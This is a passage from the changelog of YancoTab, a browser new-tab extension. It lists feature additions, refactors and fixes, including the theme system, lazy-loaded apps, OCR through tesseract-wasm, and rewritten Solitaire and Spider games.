- The other §1.2 plan items (80-star count, image-wallpaper skip, prefers-reduced-motion, FPS cap when blurred) were already shipped — confirmed in the audit.

### Changed — Unified icon system closeout
- **Built-in app icons** — all 11 standard apps and 9 games now resolve through the central icon registry (`os/ui/icons/AppIcons.js` → `PHOSPHOR_ICONS` / `GAME_ICONS`). Emoji values (`'🔢'`, `'⚙️'`, `'📝'`…) and game-prefix strings (`'game:mahjong'`…) removed from `mobileShell.js`'s apps array. User-added shortcuts still use their own `icon` (favicon URL or picked emoji) via the static-fallback path.
- **Hex container background** — single source of truth via `getCategoryColor(appId)` (productivity blue / media purple / utilities teal / games red / external orange). Per-app gradient block deleted from `shell.css` — it was fighting the inline category color and making the icons inconsistent in light mode.
- **Dead code removal** — `SmartIcon.js` lost 9 unreachable render methods (renderPhotos, renderMaps, renderSettings, renderBrowser, renderWeather, renderNotes, renderFolder, renderFiles, renderCalculator) — they were shadowed by the registry dispatch and never fired. 412 → 250 lines.

### Added — Light theme completion
- **`Auto` theme mode** — third option alongside Dark/Light. New users default to Auto and follow their OS `prefers-color-scheme` setting. Runtime listener flips the theme when the user changes their OS theme without needing a tab reload.
- **Theme settings UI** — replaces the binary Dark Mode toggle with a Dark / Light / Auto segmented control.
- **Light-mode token completeness** — `--accent-contrast`, `--depth-1..5`, `--aurora-1..3`, `--aurora-bg`, `--particle-dim`, `--particle-bright`, `--specular` all defined under `body.theme-light`. Previously these fell through to dark values, leaking dark glows + shadows into a light UI.
- **Light-mode accent pinning** — color themes (Emerald, Crimson, Amethyst…) keep their accent in dark mode but pin to system blue `#007AFF` in light mode. Reason: teal `#00e5c1` on white is 1.46:1 contrast (fails WCAG); blue is 4.51:1 (passes AA exactly). Color-theme choice is preserved — switching back to dark restores the picked accent.
- **Starfield off in light mode** — twinkling teal/white dots over a light gradient look like noise, not stars. Subscribes to `yancotab:theme_change` to start/stop on the fly.
- **`tests/theme-mode.test.js`** — 16 cases covering `getStoredMode` + `getThemeMode` resolution across explicit/legacy/auto/null storage states × OS-light/OS-dark.


- **Lazy-load apps** — boot no longer eagerly imports all 20 app classes. Each app's JS is fetched on first launch and cached on the registry entry. Boot script graph drops from ~70 modules to ~25; mid-tier-Android boot saves ~60–250ms of parse time. The service-worker precache list is unchanged so offline-first still holds — the win is JS parse cost, not bytes downloaded.
- **Spawn double-tap fix** — rapid double-tap on an icon previously dropped the second tap silently (returned pid `-1`). Empty-config spawns are now deduped: two simultaneous taps share one pid, one window. Single-window-per-icon-tap behavior preserved.
- **Multi-file open from FilesApp** — `spawn('notes', {path:A})` and `spawn('notes', {path:B})` now correctly produce two separate pids and two windows. Previously the second call could collide with the first via the spawn lock and silently fail.
- **Import failure UX** — failed lazy `import()` (network glitch, deleted file, parse error, 15s timeout) emits `system:app-error`; MobileShell shows a "Couldn't load X" toast. Previously failed silently.
- **Import retry** — a rejected loader now clears its cached promise so the next spawn re-attempts.
- **Service-worker version skew** — when SW activates over a real older cache, open clients get a `sw-updated` postMessage. MobileShell shows a non-dismissible "Reload" banner so users don't end up mixing old- and new-version modules.
- **`tests/process-manager.test.js`** — 16 cases covering register/registerLazy, concurrent spawn dedup, config-bearing spawn isolation, import failure + retry, init failure cleanup, kill-during-init, URL/scheme guards, and lifecycle event order.
- **`tests/_helpers/fakeKernel.js`** — minimal kernel double; sets the convention for future test helpers.

### Added — V1 completion polish
- **YancoModal system** — async modal dialogs (`showConfirm`, `showPrompt`, `showAlert`) with glass backdrop, Enter/Escape/click-outside support. Replaces native `confirm()`/`prompt()` in Settings, Todo, QuickLinks (14 call sites). CSS in `css/modal.css`.
- **Mahjong undo** — single-level undo restores the last matched pair. Undo button in header, disabled until a match is made.
- **Mahjong hover highlighting** — free tiles glow with teal outline on hover.
- **Card play animations** — CSS keyframes for `is-place-anim` in Tarneeb and Trix (was dead code with no CSS). Cards slide up and scale in when played to trick table.
- **Haptic feedback** — vibrate on card play (15ms) and trick win (10-30-10ms) in Tarneeb and Trix.
- **Calculator parentheses** — expression stack enables `(2+3)*4=20`. Was broken (returned early).
- **Calculator keyboard input** — digits, operators, Enter, Escape, Backspace all work from physical keyboard.
- **Calculator history** — last 20 calculations shown in toggleable panel, tappable to reuse result.
- **Calculator copy-to-clipboard** — button in display copies current value.
- **Calculator persistence** — angle mode and history saved via `kernel.storage`.

### Changed — V1 completion refactors
- **SettingsApp extraction** — 6 tab modules extracted to `os/apps/settings/` (Appearance, Home, Games, Apps, Browser, About). Shell reduced from 499 to 154 lines.
- **TodoApp CSS extraction** — inline styles moved to `css/todo.css` (381 lines). App reduced from 791 to 408 lines.
- **MapsApp CSS extraction** — inline styles moved to `css/maps.css` (413 lines). App reduced from 681 to 263 lines. Fixed duplicate style injection on every render.
- **TarneebApp view extraction** — UI builders moved to `tarneeb/tarneebView.js` (367 lines). App reduced from 707 to 396 lines.
- **TrixApp view extraction** — UI builders moved to `trix/trixView.js` (465 lines). App reduced from 789 to 314 lines.
- **CalculatorApp compaction** — `KEY_ROWS` constant and `SCI_UNARY` lookup table replace verbose methods. Reduced from 520 to 422 lines.
- **Shared game modules** — `haptics.js`, `overlay.js`, `hash.js` deduplicated from Solitaire/Spider into `os/apps/games/shared/`. 4 duplicate files deleted.

### Removed
- `css/minesweeper.css` — dead file (Minesweeper is a canvas game, never used external CSS).
- `os/apps/games/solitaire/ui/pause.js` — never imported.
- Duplicate `haptics.js` and `overlay.js` from Solitaire and Spider `ui/` directories.

### Added
- **`privacy.html`** — full public privacy policy page (12 sections: data collection, storage, permissions, third-party APIs, COPPA, security, contact). Matches landing.html visual system, self-contained, indexable. Linked from landing.html footer.
- **`_locales/en/messages.json`** — i18n message catalog with `appName`, `appShortName`, `appDescription`. Required for the `__MSG_*__` placeholders in the manifest and as the foundation for future locale additions.

### Added — OCR text recognition (Phases O1–O3: engine, UI, smoke-tested)
- **`vendor/tesseract/`** — vendored tesseract-wasm v0.11.0 (Apache-2.0): `lib.js` (96 KB), `tesseract-core.wasm` (1.8 MB SIMD build), `tesseract-worker.js` (92 KB), `eng.traineddata` (4.0 MB fast model). Full provenance in `PROVENANCE.md`. No fallback WASM (Chrome 102+ targets support SIMD).
- **`os/services/ocrService.js`** — singleton OCR service with lazy initialization. Loads tesseract-wasm on first `recognize()` call; auto-destroys worker after 30 s idle. API: `ocrService.recognize(imageSource, { unit, onProgress })` → `{ text, boxes }`. Uses `chrome.runtime.getURL()` for extension-safe asset resolution; falls back to `import.meta.url` in standalone web-app mode.
- **`os/apps/photos/OcrTool.js`** — self-contained OCR tool panel + bounding-box overlay for PhotoEditor (355 lines). "Aa Text" tool in the sidebar scans the image, shows interactive word bounding boxes, supports click/shift-click selection and Copy All / Copy Selected.
- **`tests/ocr-service.test.js`** — 18 tests covering lifecycle (init, lazy load, re-init after destroy), recognize output (text trimming, structured boxes, confidence fallback, rect isolation), idle timer teardown, concurrency (single-init for parallel calls), error propagation, and asset URL resolution. Full suite now 387/387.

### Fixed
- **OCR textarea visibility** — `el()` helper sets `value` via `setAttribute` which doesn't populate `<textarea>` visible content. Fixed to set `.value` DOM property directly.

### Changed
- **`manifest.json`** — added the three CWS-required fields the audit flagged as missing:
  - `default_locale: "en"` (mandatory once `__MSG_*__` placeholders are used)
  - `content_security_policy.extension_pages` — `script-src 'self' 'wasm-unsafe-eval'; worker-src 'self'; object-src 'self'` (`wasm-unsafe-eval` required for tesseract-wasm's `WebAssembly.compile()`; allowed in MV3 since Chrome 103)
  - `name` and `description` switched to `__MSG_appName__` / `__MSG_appDescription__`; `short_name` switched to `__MSG_appShortName__`
- **`landing.html`** — footer gains a Privacy link as the first item.
- **`sw.js`** — precache list gains OCR vendor files (`lib.js`, `tesseract-worker.js`, `tesseract-core.wasm`, `eng.traineddata`) and `ocrService.js`.
- **`SECURITY.md`** — updated CSP section to document `wasm-unsafe-eval` allowance with rationale and scope.

### Changed — storage consistency (CLAUDE.md non-negotiable #4)
- **`BrowserApp.js`** — `loadPrefs()`, `savePrefs()`, `loadState()`, `saveState()` all migrated from direct `localStorage` to `kernel.storage`. Two new REGISTRY keys added (`yancotab_browser_prefs_v1`, already in use by the app; `yancotabSearchEngine` was already registered). The one-off legacy-bookmark migration read (`_loadLegacyBookmarks`) stays as direct `localStorage` and is now labeled with a comment.
- **`ClockApp.js`** — `loadState()` and `saveState()` migrated from direct `localStorage` to `kernel.storage`. New REGISTRY key `yancotab_clock_v3` added (the phantom `yancotab_clock_state_v3` key that was in the registry but never written by any app is retained as-is).
- **`FilesApp.js`** — `sortMode`/`viewMode` constructor reads, `setView()`, `showSortMenu()` sort action, `_loadFavorites()`, `_saveFavorites()`, `_loadOrderMap()`, `_saveOrderMap()` all migrated. Four new REGISTRY keys added (`yancotab_files_sort`, `yancotab_files_view`, `yancotab_files_favs`, `yancotab_files_order_v1`). The `getStorageInfo()` loop that iterates all localStorage keys to count total bytes is intentional system-level access and stays, now documented with a comment.
- **`PhotosApp.js`** — `viewMode`, `sortMode` constructor reads and toolbar writes migrated from direct `localStorage` to `kernel.storage`. `_setAsWallpaper()` wallpaper writes also migrated. Legacy gallery migration block stays as intentional direct localStorage (one-shot, now documented with comment).
- **`appStorage.js`** — 9 new REGISTRY entries total: 6 from Browser/Clock/Files migration, plus `yancotab_photos_view`, `yancotab_photos_sort`, `yancotab_wallpaper_custom`.
- **`package.json`** — test script changed from explicit 4-file list to `node --test tests/*.test.js` (covers all 387 tests across 11 files).

### Notes
- Version intentionally **not** bumped. Per the project contract, `manifest.json` / `package.json` / `CHANGELOG.md` move together at release time. These commits land under `[Unreleased]` until the v2.4.0 cut.
- Remaining intentional direct-`localStorage` access: `BrowserApp._loadLegacyBookmarks()`, `FilesApp.getStorageInfo()`, `PhotosApp._migrateLegacyGallery()` — all one-shot migration reads or system-level byte accounting, documented with comments in each file.

---

## [2.3.3] — 2026-04-24

### Fixed
- **Spider drag snap-back discipline** — cards dropped anywhere outside a legal target now glide back to their source position instead of freezing at the release point. The 2-suit "cards go all over" chaos was caused by two interacting bugs:
  - `CardView.update()` short-circuited when the logical coords matched — so when `drag.js` wrote `style.transform` directly during a gesture, `cur` went stale and the post-dispatch `_render` silently refused to correct the position.
  - `drag.js._onUp` re-parsed the mid-drag `style.transform` with a regex and wrote it back to itself, which was a no-op on paths where no dispatch follows (illegal drops, non-tableau drops, same-column drops). `_onCancel` never snapped back at all.
- Fix: `CardView.update` always refreshes `cur` and gates the DOM write on the `.dragging` class. `drag.js` caches each card's pre-drag transform + zIndex in `dataset.dragBase{X,Y,Z}` at `_beginDrag`, and a shared `_snapBackDragged()` restores all three on both `_onUp` and `_onCancel`. `_updateDropHint` also now pre-validates legality (target top rank = head rank + 1, or empty column) so no-op hovers over the source column and mismatched-rank columns don't glow as if they were valid drop zones.
- **Topmost-card glow for drop hints** — non-empty tableau columns now light the topmost card with a new `.hot-target` class (accent outline + drop-shadow, token-sourced) so the hint is visible above stacked cards instead of being hidden behind them.

### Added
- Regression suite `tests/spider-drag-snapback.test.js` — 4 tests with a DOM shim covering illegal drop, non-tableau drop, pointer cancel, and the tap (no-movement) path. Wired into `npm test`. Full project suite now 369/369.

### Changed
- Service worker cache bumped to `yancotab-v2.3.3` to force eviction of the pre-fix `drag.js` / `CardView.js` that broke 2-suit drag on any cached install.

---

## [2.3.2] — 2026-04-24

### Added
- **Cosmic Spider (Spider Solitaire rewrite)** — wholesale replacement of the legacy broken Spider with a Yanco-themed rebuild matching the Solitaire architecture:
  - Pure engine + view split under `os/apps/games/spider/` (state, rules, moves, hints, deal, reducer)
  - 1-suit / 2-suit / 4-suit difficulty picker on the start screen; deck composition and shuffle are seeded (Mulberry32) for reproducible deals
  - 10-column tableau, stock dealt in rows of 10, K→A same-suit runs auto-collected to foundation (no manual sends), 8 foundation trophy slots tracking completed suits
  - Unlimited undo/redo, ranked hint engine (flip > empty > same-suit build > empty-target), stuck detection when no legal move AND stock is empty
  - Tap-to-move routes to the best legal destination; pointer-based drag with 6px/150ms disambiguation; Pointer Events throughout
  - Pause overlay (reuses the main menu pattern); keyboard shortcuts (N/U/R/Space/H/P/Esc)
  - Persistence through `kernel.storage` — game survives browser close; resume prompt on reopen; per-difficulty stats (best time/moves/score) in the Stats panel
  - Haptics (`navigator.vibrate`) for pickup/place/invalid/win; shared card-back gallery (Nebula/Hex/Warp/Aurora), 2-color + 4-color suit modes, left-handed mirror
  - New stylesheet `css/cosmic/spider.css` — difficulty picker + stock-pile indicator + per-difficulty stat blocks; all colors resolve to tokens from `css/tokens.css`
- Test suite `tests/spider-engine.test.js` — 64 tests covering state/rules/moves/hints/reducer/deal; full project suite stays green (365 tests)

### Changed
- `os/boot.js` lazy-registers `spider-solitaire` to the new `os/apps/games/spider/SpiderSolitaireApp.js` path
- Legacy `os/apps/games/SpiderSolitaireApp.js` removed (cardEngine retained — still used by Tarneeb/Trix)
- AppStorage REGISTRY: added `yancotab_spider_save`, `yancotab_spider_stats`, `yancotab_spider_settings` keys
- Service worker cache bumped to `yancotab-v2.3.2`, new Spider asset manifest added so fresh installs precache the full game

### Fixed
- Broken legacy Spider (DOM-owning cards, global `document.onmousemove`/`ontouchmove` drag, direct `localStorage`, no undo/redo, no seed, no stats, no save) is now a playable, persistent, Yanco-themed game

---

## [2.3.1] — 2026-04-24

### Added
- **Cosmic Klondike (Solitaire rewrite)** — complete replacement of the legacy blue Solitaire with a full Yanco-themed rebuild:
  - Pure engine + view split under `os/apps/games/solitaire/` (state, rules, moves, scoring, hints, solver)
  - Seeded Mulberry32 RNG for reproducible deals; Daily Deal keyed to UTC date
  - Draw-1/Draw-3 modes, Standard/Vegas/Cumulative Vegas scoring, timed/relaxed toggle
  - Winnable-only deals via bounded DFS solver; stuck detection when no legal moves remain
  - Unlimited undo/redo, ranked hint engine, auto-finish when board is solved-but-not-done
  - Tap-to-move and smart drag with 6px/150ms disambiguation; Pointer Events throughout
  - Pause overlay with timer freeze; keyboard shortcuts (N/U/R/Space/H/A/P/Esc)
  - Persistence through `kernel.storage` — game survives browser close; resume prompt on reopen
  - Win 3.x-style card cascade on victory (physics fountain per suit, 80ms spawn, gravity + bounce damping); static gold-halo fallback on `prefers-reduced-motion`
  - Haptics (`navigator.vibrate`) for pickup/place/invalid/win
  - 4 card backs (Nebula/Hex/Warp/Aurora), 2-color + 4-color suit modes, left-handed mirror
  - Stats panel with per-mode aggregates, Vegas bank tracking, streaks, best time/moves/score
  - New stylesheet `css/cosmic/solitaire.css` — all colors resolve to tokens from `css/tokens.css`
- `ui/haptics.js` and `ui/pause.js` helper modules to keep `SolitaireApp.js` under the 500-line cap

### Changed
- `os/boot.js` now lazy-registers `solitaire` to the new cosmic path; legacy `os/apps/games/SolitaireApp.js` and `cardEngine/` removed
- AppStorage REGISTRY: `yancotab_solitaire_settings` gains `timed: true` default, `yancotab_solitaire_stats` gains `vegasBank: 0`
- One-shot migration from legacy `yancotab_card_settings` localStorage key on first run
- Service worker cache bumped to `yancotab-v2.3.1` to force eviction of stale blue Solitaire assets

### Fixed
- Version bumped to v2.3.1 across `manifest.json`, `package.json`, `os/version.js`, and `sw.js` — this bump is itself the fix for users seeing cached v2.3.0 assets (old blue Solitaire) after the mid-2.3.x rewrite

---

## [2.3.0] — 2026-04-12

### Added
- **Greeting bar** — time-of-day personalized greeting (Good morning/afternoon/evening/night) with user name, date, and inline weather summary
- **Widget bar** — Bento-style horizontal widget row with 4 built-in widgets:
  - **Clock widget** — large digital time + date, live updating
  - **Weather widget** — temp + city + high/low from cached data
  - **Todo widget** — top 3 undone tasks with inline checkboxes (toggle without opening app)
  - **Pomodoro widget** — live countdown + progress bar when timer active
- **Quick links row** — favicon circles for favorite sites; default: Google, YouTube, GitHub, Wikipedia, Reddit; add/remove via tap/long-press
- **Command palette** — SmartSearch extended with `>` prefix for commands (`> new note`, `> add todo`, `> dark`, `> light`, `> export`) and `!` prefix for quick capture to Notes
- **Toast notification system** — glass pill notifications at bottom-center; 4 types (success/error/info/warning); auto-dismiss 3s; stackable up to 3; triggered via `kernel.emit('toast')`
- **Keyboard shortcuts** — Ctrl+K focus search, Escape close app/unfocus, Ctrl+, open Settings
- **First-run onboarding** — 3-step modal flow: Welcome → Personalize (name, theme, search engine) → Done; auto-dismiss on step 3; sets `yancotab_onboarding_done` flag
- New storage keys: `yancotab_user_name`, `yancotab_widgets`, `yancotab_quick_links`, `yancotab_onboarding_done`, `yancotab_discovery_dismissed`
- **18 built-in apps** — Notes, Todo, Pomodoro, Calculator, Weather, Clock, Browser, Files, Settings, Solitaire, Spider Solitaire, Minesweeper, Mahjong, Snake, Memory, Tic-Tac-Toe, Tarneeb, Trix
- **Desktop UI** — app grid with drag-and-drop, folders, multi-page support, pinnable dock
- **Smart Search** — fuzzy matching, command palette (`>` prefix), quick capture (`!` prefix), keyboard navigation
- **Greeting bar** — time-of-day greeting with Playfair Display serif font, date, live clock
- **Widget bar** — glanceable clock, weather, todo (inline checkboxes), pomodoro widgets
- **Quick links** — favicon row for favorite sites
- **Cosmic glass design** — starfield background, glass morphism, 7 wallpapers, light/dark mode
- **Cosmic Klondike** — full Solitaire rewrite with Draw-1/3, Vegas scoring, daily deals, seeded RNG, unlimited undo, win cascade, card-back gallery
- **Cosmic Spider** — full Spider Solitaire rewrite with 1/2/4-suit difficulty, persistence, stats
- **OCR text recognition** — extract text from images in Photos app via tesseract-wasm
- **PDF Reader** — open, import, save, print PDFs with drag-and-drop support
- **Onboarding** — 3-step first-run flow (welcome, personalize, done)
- **Toast notifications** — glass pill feedback for user actions
- **Keyboard shortcuts** — Ctrl+K search, Escape close, Ctrl+, settings
- **Privacy policy** — full privacy.html page for store compliance
- **i18n** — `_locales/en/messages.json` for CWS manifest localization
- **Lazy loading** — apps load on first launch, boot loads only core modules
- **Unified storage** — AppStorage with envelope format, chrome.storage.sync, chunking, export/import
- **Virtual filesystem** — localStorage-backed with directories, rename, move, search
- **AI card games** — Tarneeb and Trix with intelligent AI opponents
- **Offline-first** — service worker caches everything, works without network
- **Zero tracking** — no analytics, no telemetry, no accounts, `storage` permission only

[1.0.0]: https://github.com/YamanAddas/YancoTab/releases/tag/v1.0.0
